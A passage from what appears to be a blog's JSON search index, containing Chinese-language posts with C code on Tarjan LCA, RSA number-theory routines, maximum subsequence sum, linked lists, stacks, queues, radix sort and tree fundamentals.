、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"LCA和RSA","slug":"Algorithms-Must1","date":"2015-09-10T11:35:40.000Z","updated":"2016-11-04T15:48:02.000Z","comments":true,"path":"2015/09/10/Algorithms-Must1/","link":"","permalink":"http://forec.github.io/2015/09/10/Algorithms-Must1/","excerpt":"Tarjan离线求解LCA和RSA加密算法。","text":"Tarjan离线求解LCA和RSA加密算法。 Tarjan离线求解LCA LCA（Least Common Ancestors），最近公共祖先，即在有根树中寻找到两个结点u，v距离和最短的结点，亦即离根最远的结点。 算法基于DFS和并查集，时间复杂度由DFS的V和查询次数M决定，O（V+M）。在下面给出的代码样例中采用链式结构存储树，采用邻接表结构双向存储查询端点，也可以通过两个边集数组实现。 算法流程： 初始化：设置par数组（并查集），par[i] = i。离线所有查找请求，存储于无向图邻接表中。 从根结点开始tarjan（DFS），对于每次新探求到的顶点u，对照每个查询请求（u，v），判断这条询问请求中的另一个结点v是否被搜索过。如果v尚未被搜索则暂时跳过该条请求（在我的样例中将这条请求留到了（v，u）处理），如果v已经被搜索过，则LCA（u，v）= Find（v），这里的Find是并查集操作。 搜索并处理u包含的所有子树（每棵子树搜索完成意味着所有子树内的LCA询问都已经被解决）。在v的所有子树被搜索完成后，回溯时合并祖先，将所有自v处搜索出的顶点的par值设为u。 tarjan所有结点。 核心部分的伪代码 123456789tarjan(u) vis[u] &lt;- true for each (u, v) in questions if vis[v] ans(u, v) &lt;- Find(v) for each (u, v) in tree if !vis[v] tarjan(v) par[v] &lt;- u 对LCA（u，v）= Find（v）给出证明：因为v在遍历到u（当前结点）前被遍历过，而又由某个结点拓展到u，所以以最近公共祖先为根并且包含v的子树已经被搜索过，若有一个从当前结点u到结点v的查询，这时当前这棵子树的祖先就是最近公共祖先（注意当前的含义，当对v的搜索不断回溯时，Find（v）的值会在不断变化）。 样例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;stdlib.h&gt;typedef struct Node &#123; int num; struct Node * left, * right;&#125;node;typedef struct granode&#123; int v; int ans; struct granode *next;&#125;granode; int V, E, Q;int * vis, * par;node * tree, * root = NULL;granode ** list;int Find( int u )&#123; return par[u] == u ? u : Find( par[u] );&#125;void insert( int u, int v )&#123; granode * temp = ( granode * ) malloc ( sizeof( granode ) ); temp-&gt;v = v; temp-&gt;next = list[u]; list[u] = temp;&#125;void init()&#123; scanf( \"%d %d %d\", &amp;V, &amp;E, &amp;Q ); int i, father, child, u, v; tree = ( node * ) malloc ( sizeof( node ) * ( V + 1 ) ); par = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); vis = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); list = ( granode ** ) malloc ( sizeof( granode* ) * ( V + 1 ) ); memset( vis, 0, sizeof( int ) * ( V + 1 ) ); for ( i = 1 ; i &lt;= V ; i++ )&#123; tree[i].num = i; tree[i].left = tree[i].right = NULL; list[i] = NULL; par[i] = i; &#125; for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d\", &amp;father, &amp;child ); vis[child] = 1; if ( tree[father].left == NULL ) tree[father].left = tree + child; else tree[father].right = tree + child; &#125; for ( i = 1 ; i &lt;= V ; i++ ) if ( !vis[i] ) root = tree + i; memset( vis, 0, sizeof( int ) * ( V + 1 ) ); for ( i = 1 ; i &lt;= Q ; i++ )&#123; scanf( \"%d %d\", &amp;u, &amp;v ); insert( u, v ); insert( v, u ); &#125;&#125;void tarjan( node * n )&#123; vis[ n-&gt;num ] = 1; int u = n-&gt;num; granode * temp = list[u]; while ( temp != NULL )&#123; if ( vis[ temp-&gt;v ] ) temp-&gt;ans = Find( temp-&gt;v ); temp = temp-&gt;next; &#125; if ( n-&gt;left != NULL ) if ( !vis[ n-&gt;left-&gt;num ] )&#123; tarjan( n-&gt;left ); par[ n-&gt;left-&gt;num ] = u; &#125; if ( n-&gt;right != NULL ) if ( !vis[ n-&gt;right-&gt;num ] )&#123; tarjan( n-&gt;right ); par[ n-&gt;right-&gt;num ] = u; &#125;&#125;void print()&#123; int i; for ( i = 1 ; i &lt;= V ; i++ )&#123; granode * temp = list[i]; while ( temp != NULL ) &#123; if ( temp-&gt;ans ) printf( \"%d %d %d\\n\", i, temp-&gt;v, temp-&gt;ans ); temp = temp-&gt;next; &#125; &#125;&#125;int main()&#123; init(); printf(\"Root : %d\\n\",root-&gt;num ); tarjan( root ); print(); return 0;&#125; 运行结果 RSA 选取两个不同的大素数p、q，并计算N = p×q，选取小素数d，并求出e = ~d，使 d × e ≡ 1 mod (p-1)(q-1)。对于任意明文 A &lt; N有密文B =A^d mod N，解密时A = B^e mod N。因此d和~d形成了非对称密钥关系，使用公钥d加密，私钥e解密，即使第三方获取了密文B、公钥d和模数N，因为目前的RSA大多以大于1024位的大数为基础，因此对N进行素数因子分解近似不可能（不考虑量子算法），因此无法获取p，q，也就无法推算e。 大数运算 目前多为32和64bit编译器，对于1024位以上的大数运算通常将其作为数组处理。如果选取十进制，2^1024会产生一个长度300多位的数组，对于四则运算的任何一种操作都需要在两个数百位的数组上进行，效率非常低，并且将其转换成二进制非常麻烦。通常的改进方法是将大数用n进制数组表示，这里的n为2的幂，对32bit系统可以取n = 2 ^ 32（0x100000000），将1024位大数用该进制表示即为32位，每一位的取值是2^32进制的0～0xffffffff。这刚好是32位系统中long的长度。此时对该数组进行的任意运算所需的循环规模不超过32次，并且因为进制是2的次幂，与二进制的转换非常容易。 存储方式：例如0xffffffff ffffffff，转换成十进制是18446744073709551615，格式类似于十进制中的99，十六进制中的0xFF。而0x00000001 00000000 00000000，转换成十进制是18446744073709551615 + 1 = 18446744073709551616，格式类似十进制的100，十六进制的0x0100。在数组中，i从0到n分别按由低位到高位的顺序存储。对于一个数组A表示的大数，其值通过如下方式计算：for i from 0 to n { ans &lt;- ans + A[i] × base ^ i }。显然各个数字间的运算中间结果可能超出32位长度，因此需要64位的数据（long long，__int 64）类型存储（部分32位编译系统不支持64位，可使用2^16进制，并将32位数据类型用来存储中间结果；或者将2^32进制改成4×2^28进制，也就是0x40000000进制，这样两个数字运算最大结果为0x3fffffff × 0x3fffffff，不超过0xffffffffffffff，可以用double类型存储，但不能将中间结果简单的拆分成高位和低位）。 假设存在大数A和B，A.length和B.length表示各自长度，base = 0x100000000，0 &lt;= A[i],B[i] &lt; base。 加法：处理进位情况和长度变化即可 12345678__int64 temp;int pre = 0, len = max( A.length, B.length );for ( i = 0 ; i &lt;= len ; i++ )&#123; temp = A[i] + B[i] + pre; res[i] = temp % 0x100000000; pre = temp / 0x100000000;&#125;res.length = pre == 0 ? len : len + 1; 减法：对中间结果是负数的需要借位 1234567891011121314int pre = 0;int len = max( A.length, B.length );for ( i = 0 ; i &lt;= len ; i++ )&#123; res[i] = A[i] - B[i] - pre; if ( res[i] &gt;= 0 ) pre = 0; else &#123; res[i] += 0x100000000; // 借位 pre = 1; &#125;&#125;res.length = len;while ( res[res.length] == 0 ) res.length--; //去除大数前端多余的0 乘法：竖式运算，假设B.length &lt; A.length，则res[i] = Sum{ A[i-j] × B[j], j from 0 to B.length }。res.length初始可以设置为A.length + B.length - 1，考虑到进位，最后可以根据情况增加一位。 123456789101112131415__int temp;int pre = 0;res.length = A.length + B.length - 1;for ( i = 0 ; i &lt;= res.length ; i++ )&#123; temp = pre; for ( j = 0 ; j &lt;= B.length ; j++ )&#123; if ( i &gt;= j &amp;&amp; i &lt;= j + A.length )&#123; temp += A[i-j] * B[j]; // 竖乘 res[i] = temp % 0x100000000; pre = temp / 0x100000000; &#125; &#125;&#125;if ( pre ) res[++res.length] = pre; // 最高位进位 除法：通过蒙哥马利算法可以通过移位操作代替除法求得模乘运算的结果 米勒·拉宾算法 算法流程 根据RSA中的N计算出一个奇数M，使得N = 1 + M × 2^r 。 选择一个小于N的随机数C，对于任意的i &lt; r，如果C^( ( M × 2^i ) % N) == N - 1或者C^M % N == 1，则N通过随机数C的测试。 重复上一步五次，如果全部通过则判定N为素数 若N通过一次测试，则N为合数的概率为25%，当N通过t次测试，N为合数的概率为0.25^t。t为5时N为素数的概率已经大于99.9%。实际操作中通常用300个小素数对N进行测试，如果N通过小素数测试再使用米勒·拉宾测试，提高测试速度。 欧几里德方程 根据辗转相除法，当gcd(a,b) = 1，有sa + tb = 1。将求解a和b的gcd过程写出，逆向即可求得~b，使得b×~b ≡ 1（mod a）。 辗转相除法的逆运算求解gcd（101,4620），有如下：4620 = 45 × 101 + 75101 = 1 × 75 + 26&nbsp;&nbsp;75 = 2 × 26 + 23&nbsp;&nbsp;26 = 1 × 23 + 3&nbsp;&nbsp;&nbsp;3 = 1 × 2 + 1&nbsp;&nbsp;&nbsp;2 = 2 × 1对上述操作求逆操作，为：1 = 3 - 1 × 2&nbsp;&nbsp;= 3 - 1 ×（23 - 7 × 3）= -1 × 23 + 8 × 3&nbsp;&nbsp;= -1 × 23 + 8 ×（26 - 1 × 23）= 8 × 26 - 9 × 23&nbsp;&nbsp;= 8 × 26 - 9 ×（75 - 2 × 26）= -9 × 75 + 26 × 26&nbsp;&nbsp;= -9 × 75 + 26 ×（101 - 1 × 75）= 26 × 101 - 35 × 75&nbsp;&nbsp;= 26 × 101 - 35 ×（4620 - 45 × 101）= -35 × 4620 + 1601 × 101 下列代码传入的参数r最后为求得的~b。 12345678910void get( int a, int b, int *l, int *r)&#123; /* 逆向欧几里得求 1 = st + qa */ if ( a % b == 1 )&#123; *l = 1; *r = -a / b; &#125; else &#123; get( b, a % b, l, r ); (*r) = (*r) * ( - a / b ) + *l; /* r为求得的modular */ &#125; &#125; 非递归的代码如下( sa + tb = 1 )，返回的t即为~b。 1234567891011121314int get( int a, int b )&#123; int t = 0, s = 1, temp; while ( b ! = 0 )&#123; temp = s; s = t - s * b / a; t = temp; temp = b; b = a % b; a = temp; if ( t &lt; 0 ) t += a; &#125; return t;&#125; Montgomery幂模算法 Montgomery（蒙哥马利）算法的优点在于减少了取模的次数，并且用移位取代除法。举例：进制base = 13，对于32 = 2 × 13 + 7。要求32×13^k mod 7的值，可以对32进行如下操作：32 = 32 + 7 × q，这样不影响取模的结果。当32 + 7 × q是13的整数倍的时候就可以用移位操作除以13，直到求出结果。 伪代码 123456789func() a^b mod c res &lt;- 1 pow &lt;- b while a &gt; 0 pow &lt;- ( pow * pow ) mod c if a &amp; 1 = 1 // 以二进制为例，对于n进制有同样的增值运算 res &lt;- ( res * pow ) mod c a &gt;&gt; 1 // 对于任意进制同样移位 return res 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/10/Algorithms-Must1/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"部分问题例程","slug":"Data-Structure-example1","date":"2015-09-09T07:17:49.000Z","updated":"2016-11-04T15:55:06.000Z","comments":true,"path":"2015/09/09/Data-Structure-example1/","link":"","permalink":"http://forec.github.io/2015/09/09/Data-Structure-example1/","excerpt":"基础数据结构中部分问题例程","text":"基础数据结构中部分问题例程 摘要 最大子序列和问题 单向链表的类型声明及其ADT包含的操作 链表实现基数排序 栈ADT链表实现 栈ADT数组实现 逆波兰表达式 约瑟夫环问题 例程最大子序列和问题 给定一个整数数列A1,A2,,…,An，求∑ A(k) ( k from i to j ，0 &lt;= i &lt;= j &lt;= n )的最大值。规定，当所有整数均为负数，则结果为0。 以下共四种代码，时间复杂度由高到低。 O( N^3 )代码，枚举所有的子序列 123456789101112int MaxSubsequenceSum( const int A[], int N)&#123; int tempSum, MaxSum = 0, i, j, k; for ( i = 0 ; i &lt; N ; i++ ) for ( j = 0 ; j &lt; N ; j++ )&#123; tempSum = 0; for ( k = i ; k &lt; j ; k++ ) tempSum += A[k]; if ( tempSum &gt; MaxSum ) MaxSum = tempSum; &#125; return MaxSum;&#125; O( N^2 )代码，由∑(i-&gt;j) = ∑(i-&gt;j-1) + Aj 可简化上述代码一层循环 123456789101112int MaxSubsequenceSum( const int A[], int N)&#123; int tempSum, MaxSum = 0, i, j; for ( i = 0 ; i &lt; N ; i++ )&#123; tempSum = 0; for ( j = i ; j &lt; N ; j++ )&#123; tempSum += A[j]; if ( tempSum &gt; MaxSum ) MaxSum = tempSum; &#125; &#125; return MaxSum;&#125; O( NlogN )代码，分治。MaxSubsequence只可能出现在1.整个序列的最左端，2.整个序列的最右端，3.中间的某一段。对于一段序列，将其一分为二后，只需要比较两个序列各自的MaxSubsequenceSum，之后再和某个中间的最大子序列比较，中间最大子序列的判定：包含左半部分最后一个数的最大和子序列和包含右半部分第一个数的最大和子序列相连接。 123456789101112131415161718192021222324252627282930static MAX3( int a, int b, int c )&#123; a = a &gt; b ? a : b ; return a &gt; c ? a : c ;&#125;static int Partition( const int A[], int l, int r)&#123; if ( l == r ) // Only one number if ( A[l] &gt; 0 ) return A[l]; else return 0; int MaxL, MaxR; int MaxLBorder = 0 , MaxRBorder = 0 , tempLBorder = 0 , tempRBorder = 0; int mid = ( l + r ) &gt;&gt; 1, i; MaxL = Partition( A, l, mid ); MaxR = Partition( A, mid + 1, r ); for ( i = mid ; i &gt;= l ; i-- )&#123; tempLBorder += A[i]; if ( tempLBorder &gt; MaxLBorder ) MaxLBorder = tempLBorder; &#125; for ( i = mid + 1 ; i &lt;= r ; i++ )&#123; tempRBorder += A[i]; if ( tempRBorder &gt; MaxRBorder ) MaxRBorder = tempRBorder; &#125; return MAX3( MaxL , MaxR , MaxLBorder + MaxRBorder );&#125;int MaxSubsequence( const int A[], int N )&#123; return Partition( A , 0 , N - 1 );&#125; O( N ) 代码，正确性容易理解。以上三份代码均为离线算法，此代码满足联机特性（不需要记忆数据，顺序读入的同时处理数据）。 1234567891011int MaxSubsequenceSum( const int A[], int N )&#123; int tempSum = 0, MaxSum = 0, i; for ( i = 0 ; i &lt; N ; i++ )&#123; tempSum += A[i]; if ( tempSum &gt; MaxSum ) MaxSum = tempSum; else if ( tempSum &lt; 0 ) tempSum = 0; &#125; return MaxSum;&#125; 单向链表的类型声明及其ADT操作 类型声明（模拟整型数组） 1234567891011121314151617typedef struct Node&#123; int value; struct Node* next;&#125;Node;#ifndef _List_Node * MakeEmpty( Node * L );Node * Find( int toFind, Node * L );Node * FindPrevious( int present, Node * L );Node * head; // need to mallocint IsEmpty( Node * L );int IsLast( Node * present, Node * L );void Insert( int x, Node * L, Node * insertP );void Delete( int x, Node * L );void DeleteList( Node * L );#endif /* _List_ */ ADT操作实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int IsEmpty( Node * L )&#123; return L-&gt;next == NULL;&#125; /* return true if L is empty */int IsLast( Node * present, Node * L )&#123; return P-&gt;next == NULL;&#125;Node * Find( int toFind, Node * L )&#123; Node * P = L-&gt;next; while ( P != NULL &amp;&amp; P-&gt;value != toFind ) /* 1 */ P = P-&gt;next; return P; /* 1. if P == NULL, then the check after &amp;&amp; won't run */&#125;Node * FindPrevious( int present, Node * L )&#123; Node * P = L; while ( P-&gt;next != NULL &amp;&amp; P-&gt;next-&gt;value != toFind ) /* 1 */ P = P-&gt;next; return P;&#125;void Insert( int x, Node * L, Node * insertP )&#123; Node * temp = ( Node * )malloc( sizeof ( Node ) ); if ( temp == NULL ) FatalError(\"flood\"); temp-&gt;value = x; temp-&gt;next = insertP-&gt;next; insertP-&gt;next = temp;&#125;void Delete( int x, Node * L )&#123; Node * P = FindPrevious( x, L ); Node * temp; if ( !IsLast( P, L ) )&#123; temp = P-&gt;next; P-&gt;next = temp-&gt;next; free( temp ); &#125;&#125;void DeleteList( Node * L )&#123; Node * P = L-&gt;next, temp; L-&gt;next = NULL; while ( P != NULL )&#123; temp = P-&gt;next; free( P ); P = temp; &#125;&#125; 链表实现基数排序 基数排序（卡式排序）有N个整数，范围从0~M-1，对其进行排序。 小学生排序法（计数排序）是桶数为M的简单的基数排序，时间复杂度O(N+M)。 基数排序按照位优先的方式进行桶式排序，假设有10个桶0~9，输入样例为243 2434 24 1328 41 72 385 3902 903 3，随便敲的数。先按照最低位排序，得表如下01234567894172390224390332434243851328之后按照次最低位（十位）排序，得表如下01234567893903390224132824344124372385按照百位排序，得表如下01234567897241243243132838524343902903按照千位排序，得表如下01234567899033852437241243132824343902每次排序过程中都只有N个数据节点之间的交换，整个算法时间复杂度为O(H*P)，其中P为桶数，H为数据以P进制表示可以达到的最高位数。上例中H为4（最高位千位），P为10。 降序排列代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/* * @author Forec * Test radix sorting */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;const int MaxLen = 200;typedef struct node&#123; int value; struct node * next;&#125;node;node head[10];int main()&#123; int input[MaxLen]; int n, i, j, max = 0; for ( i = 0 ; i &lt;= 9 ; i++) head[i].next= NULL; scanf(\"%d\",&amp;n); for ( i = 0 ; i &lt; n ; i ++)&#123; scanf(\"%d\",input+i); node * temp = (node*)malloc(sizeof(node)); if ( temp == NULL)&#123; printf(\"NULL error\"); exit(0); &#125; temp-&gt;next= head[input[i]%10].next; temp-&gt;value = input[i]; head[input[i]%10].next = temp; if ( input[i] &gt; max) max = input[i]; &#125; int base = 1, h = 0; while ( max / base != 0 )&#123; base *= 10; h++; &#125; int baseh = 100,basel = 10; for ( i = 2 ; i &lt;= h ; i++)&#123; for ( j = 0 ; j &lt;=9 ; j++)&#123; node * pre = head+j; node * temp= head[j].next; while (temp!=NULL)&#123; int pos = (temp-&gt;value%baseh)/basel; if ( pos != j )&#123; pre-&gt;next = temp-&gt;next; temp-&gt;next = head[pos].next; head[pos].next = temp; temp = pre-&gt;next; &#125; else &#123; pre = temp; temp = temp-&gt;next; &#125; &#125; &#125; baseh*=10; basel*=10; &#125; for ( j = 9 ; j &gt;= 0 ; j --)&#123; node *temp = head[j].next; while ( temp != NULL)&#123; printf(\"%d \",temp-&gt;value); temp = temp-&gt;next; &#125; &#125;&#125; 逆波兰表达式 实现步骤 给出中缀表达式，如 3*(1/4+2) 定义两个栈（符号入栈in和操作出栈out） 从左至右读取中缀表达式，读入数字直接压入出栈（out），读入第一个运算符直接压入入栈（in），读入’(‘直接压入入栈（in）。 按上述规则读取若干次后，此时栈in中为{,(,/},栈out中为{3,1,4}，读入操作符’+’，与栈顶操作符’/‘比较，因’+’优先级低于’/‘，将in出栈至out，直到in的栈顶为比’+’优先级低的预算操作符或’(‘，再将’+’压入in。此时in中为{,(,+}，out中为{3,1,4,/}。即： 高于栈顶运算符级别的算符直接进栈，低于或等于栈顶级别的要将in按次压入out，直到in的栈顶操作符优先级低于当前操作符。 最后读取”)”时要找到入栈in中最近的”(“，将括号内符号按后进先出的顺序全部压入出栈out，此时两栈的数据为：in[]，out[3,1,4,/,+,*]。 系统读取中缀表达式结束后将入栈in中的所有符号出栈并依次压入出栈out中。 栈ADT的链表实现 类型声明（以整型数据为例） 12345678910111213typedef struct Node&#123; int value; struct Node *next;&#125;Node;#ifndef _Stack_int IsEmpty( Node * S );void MakeEmpty( Node * S );void Push( int x, Node * S );void Pop( Node * S );int Top( Node * S );Node * CreateStack( void );#endif /* _stack_ */ 实现代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int IsEmpty( Node * S )&#123; return S-&gt;next == NULL;&#125;int Top( Node * S )&#123; if ( !IsEmpty( S ) ) return S-&gt;next-&gt;value; Error(\"Empty Stack\"); return 0;&#125;void Pop( Node * S )&#123; if ( IsEmpty( S ) ) Error(\"Empty Stack\"); else &#123; Node * temp = S-&gt;next; S-&gt;next = temp-&gt;next; free( temp ); &#125;&#125;void MakeEmpty( Node * S )&#123; if ( S == NULL ) Error(\"NULL Exception\"); else while( !IsEmpty( S ) ) Pop( S );&#125;Node * CreateStack()&#123; Node * S = ( Node * )malloc( sizeof ( Node ) ); if ( S == NULL ) FatalError(\"flood\"); S-&gt;next = NULL; MakeEmpty( S ); return S;&#125;void Push( int x, Node * S )&#123; Node * temp = ( Node * ) malloc ( sizeof( Node ) ); if ( temp == NULL ) FatalError(\"flood\"); else &#123; temp-&gt;value = x; temp-&gt;next = S-&gt;next; S-&gt;next = temp; &#125;&#125; 栈ADT的数组实现 类型声明（以整型数据为例） 123456789101112131415typedef struct Stack&#123; int top; int cap; int *array;&#125;Stack;#ifndef _Stack_int IsEmpty( Stack * S );int IsFull( Stack * S );Stack * CreateStack( int MaxLen );void Push( int x, Stack * S );void Pop( Stack * S );void MakeEmpty( Stack * S );int Top( Stack * S );#endif /* _Stack_ */ 实现代码12345678910111213141516171819202122232425262728293031323334353637383940414243void MakeEmpty( Stack * S )&#123; S-&gt;top = 0;&#125; Stack * CreateStack( int MaxLen )&#123; Stack * S = ( Stack * ) malloc ( sizeof ( Stack ) ); if ( S == NULL ) FatalError(\"flood\"); S-&gt;array = ( int * ) malloc ( sizeof( int ) * MaxLen ); if ( S-&gt;array == NULL)&#123; FatalError(\"flood\"); S-&gt;cap = MaxLen; MakeEmpty( S ); return S;&#125;int IsEmpty( Stack * S )&#123; return S-&gt;top == 0;&#125;int IsFull( Stack * S )&#123; return S-&gt;top &gt; S-&gt;cap;&#125;void Push( int x, Stack * S )&#123; if ( IsFull( S ) ) Error(\"Full Stack\"); else S-&gt;array[ S-&gt;top++ ] = x;&#125;int Top( Stack * S )&#123; if ( !IsEmpty( S ) ) return S-&gt;array[ S-&gt;top - 1 ]; Error(\"Empty Stack\"); return 0;&#125;void Pop( Stack * S )&#123; if ( IsEmpty( S ) ) Error(\"Empty Stack\"); else S-&gt;top--;&#125; 约瑟夫环问题（队列链表模拟实现） n个整数（1~n）围成一圈，从1开始，每隔m个数则出列。输出最后一个数。如n=3，m=2，则3最先出列(1,2,3)，之后1出列(1,2,1)，最后一个数为2。 代码如下 12345678910111213141516171819202122232425262728293031323334353637383940/* * @author Forec * Test Joseph */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct node&#123; int num; struct node * next;&#125;node;int main(int argc, char const *argv[])&#123; int n, m, i; scanf(\"%d %d\",&amp;n,&amp;m); node * front = ( node * )malloc( sizeof( node ) ); node * rear = front; front-&gt;num = 1; node * temp; for ( i = 2 ; i &lt;= n ; i++ )&#123; temp = ( node * )malloc( sizeof( node ) ); temp-&gt;num = i; temp-&gt;next = NULL; rear-&gt;next = temp; rear = temp; &#125; rear-&gt;next = front; temp = front; while ( --n )&#123; for ( i = 0 ; i &lt; m ; i++ )&#123; temp = temp-&gt;next; rear = rear-&gt;next; &#125; rear-&gt;next = temp-&gt;next; free(temp); temp = rear-&gt;next; &#125; printf(\"%d\\n\", temp-&gt;num ); return 0;&#125; 队列ADT的代码实现 类型声明（数组模拟，循环队列） 1234567891011121314151617typedef struct Queue&#123; int cap; int front; int fear; int size; int *array;&#125;Queue;#ifndef _Queue_int IsEmpty( Queue * Q );int IsFull( Queue * Q );int Front( Queue * Q );void Dequeue( Queue * Q );void Enqueue( int x, Queue * Q );void MakeEmpty( Queue * Q );Queue * CreateQueue( int MaxLen );#endif 代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int IsEmpty( Queue * Q )&#123; return Q-&gt;size == 0 ;&#125;int IsFull( Queue * Q )&#123; return Q-&gt;size == Q-&gt;cap;&#125;void MakeEmpty( Queue * Q )&#123; Q-&gt;size = 0; Q-&gt;front = 1; Q-&gt;rear = 0;&#125;void Enqueue( int x, Queue * Q )&#123; if ( IsFull( Q ) ) Error(\"Full Queue\"); else&#123; Q-&gt;size++; Q-&gt;rear = ( Q-&gt;rear + 1 ) % Q-&gt;cap; &#125;&#125;void Dequeue( Queue * Q )&#123; if ( IsEmpty( Q ) ) Error(\"Empty Queue\"); else&#123; Q-&gt;size--; Q-&gt;front = ( Q-&gt;front + 1 ) % Q-&gt;cap; &#125;&#125;Queue * CreateQueue( int MaxLen )&#123; Queue * temp = ( Queue * ) malloc ( sizeof ( Queue ) ); if ( temp == NULL ) FatalError(\"flood\"); temp-&gt;cap = MaxLen; temp-&gt;array = ( int * ) malloc ( sizeof( int ) * MaxLen ); if ( temp-&gt;array == NULL ) FatalError(\"flood\"); MakeEmpty( temp ); return temp;&#125;int Front( Queue * Q )&#123; return Q-&gt;array[ Q-&gt;front ];&#125; 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/09/Data-Structure-example1/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Data-Structures","slug":"Data-Structures","permalink":"http://forec.github.io/tags/Data-Structures/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"基础数据结构（需求和树相关）","slug":"Data-Structure-basis1","date":"2015-09-08T10:01:00.000Z","updated":"2016-11-04T15:48:32.000Z","comments":true,"path":"2015/09/08/Data-Structure-basis1/","link":"","permalink":"http://forec.github.io/2015/09/08/Data-Structure-basis1/","excerpt":"这篇文章中的C语言代码均为md编辑器中手打，仅作理解用，未经过编译测试。有错误请留言，将及时更正。","text":"这篇文章中的C语言代码均为md编辑器中手打，仅作理解用，未经过编译测试。有错误请留言，将及时更正。 摘要 需求 树 二叉查找树 AVL树 红黑树 需求 基本的数学知识 指对数、级数、模运算，常用换底公式，几何/算术级数公式以及同余的一些相关公式。 log(a)B = log(c)B/log(c)A &nbsp;&nbsp; （c &gt; 0） ∑(0-&gt;N) A^i &lt; 1/(1-A) &nbsp;&nbsp; （0 &lt; A &lt; 1） ∑(1-&gt;N) i^2 = N(N+1)(2N+1) / 6 ≈ N^3 / 3 ∑(1-&gt;N) i^k ≈ N^(k+1) / |k+1| &nbsp;&nbsp;（k != -1） Hn(调和数) = ∑(1-&gt;N) 1 / i ≈ ln N 误差γ（欧拉常数） ≈ 0.57721566 A+C≡B+C(mod N) &amp;&amp; AD≡BD(mod N) &nbsp;&nbsp; （A≡B mod N） 数学归纳法和反证法 递归和算法时空复杂度分析（离散数学上册，考虑最坏结果） 一个经典的例子：最大子序列和问题，在本文底部。 一般估计：根据循环嵌套得到的迭代次数估计复杂度 常可寻找的优化：递推式取代循环，分治，循环数组，记忆化。 三种基本数据结构ADT 抽象数据类型（abstract data type， ADT）是一些操作的集合：例如对于集合ADT，可以有如交、并、测定长度等操作，也可以只有交、并两种操作，这从集合上定义了两种不同的ADT。 表ADT 对表（list）的所有操作可以通过数组实现 需要估计表所需数组的最大长度，资源浪费 PrintList和FindItem以线性时间执行，且FindKth为常数时间 Insert和Delete操作最坏时间复杂度为O(N)，平均情况下每次操作均需移动表中一般的元素 链表 减少Insert和Delete操作的线性开销（根本在于表的存储不是连续的） FindKth以线性时间执行 数组模拟链表，类似图的前向星表示法，采用一组cursor实现（游标）。 两个实例单向链表的类型声明及其ADT包含的操作和链表实现基数排序在本文底部。 栈ADT 栈（stack）是的插入和删除操作只能在一个位置上进行的表，该位置为表的末端，称为栈顶（top）。 主要有push和pop操作，先进后出。 通过链表或数组实现。链表操作调用的malloc和free函数开销较大。数组实现避免了指针，并且更流行，但需要提前声明大小，浪费资源。 栈ADT链表实现和栈ADT数组实现在本文底部例程中。 应用 平衡符号 逆波兰表达式，在本文底部有其实现方式的简单介绍。 函数调用的存储工作由系统栈完成，尽量避免尾递归。 队列ADT 基本操作是入队(Enqueue)和出队(Dequeue)，先进先出。 需要注意队列是否为空的条件。循环队列可以满足一些问题的模型，同时改善数组实现队列的空间利用率。 应用 约瑟夫环问题，链表模拟实现代码在本文例程中。 排队作业问题 队列ADT数组模拟代码实现 树 树的实现、遍历和应用 基本概念每个节点可以有任意多个子女，也可能没有子女。没有子女的节点为叶子结点（树叶），具有相同父亲的节点为兄弟。 实现每个节点包含一个指向其第一个子女的指针（向下），和一个指向其下一个兄弟的指针（平行）。 12345struct TreeNode&#123; ElementType element; struct TreeNode * firstChild; struct TreeNode * nextBrother;&#125; 遍历和应用 应用：操作系统的目录结构 遍历方式：先序遍历（先处理父亲节点，如打印目录内全部文件），后序遍历（先处理诸子女，如统计该目录所占空间大小） 二叉树 二叉树的每个节点不能有多于两个子女平均二叉树的深度为O(sqrt(N))，二叉查找树的平均深度为O(logN)，可达最坏深度为N-1。 二叉树的数学基础 高度为h的二叉树至多有2^h 个叶子结点；高度为h≥0的二叉树至少有h+1个结点；高度不超过h(≥0)的二叉树至多有2^h+1 -1个结点；含有n≥1个结点的二叉树的高度至多为n-1；含有n≥1个结点的二叉树的高度至少为logn，因此其高度为Ω(logn)。 满二叉树：高度为h的满二叉树，共有2^h+1 -1个结点；共有2^h 个叶子,共有2^h -1个内结点，内结点个数比叶子少1。 完全二叉树：第h层的从左到右第k个结点的编号为2^h +k-1；叶子个数或者和内结点个数相等或者多1；通过本结点的编号可以快速得到父结点（i/2)、左右孩子（2×i，2×i+1）的编号。 表达式树 表达式树的操作数是树叶，其他节点为操作符。方便起见，假设所有操作均为二元的，则该表达式树刚好是二叉树（节点有可能含有多于两个子女，或只含有一个子女，如单目运算符）。此时分别先序（中左右），中序（左中右），后序（左右中）遍历，得到的即为对应的前缀，中缀和后缀表达式。 